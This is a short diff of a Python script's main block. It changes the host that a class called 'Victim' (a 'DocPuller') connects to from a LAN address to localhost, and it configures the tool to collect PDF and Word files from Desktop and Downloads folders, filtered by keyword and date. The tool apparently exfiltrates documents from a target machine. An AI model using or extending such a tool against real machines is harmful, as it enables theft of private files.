@@ -38,6 +38,6 @@ class Victim(DocPuller, Protocol):
 
 
 if __name__ == '__main__':
-    Victim('192.168.1.133', 8830,
+    Victim('localhost', 8830,
            ('Desktop', 'Downloads'), ('.pdf', '.doc'), ('test', 'math'), {'2023': ('06', '05',)}
            ).main()
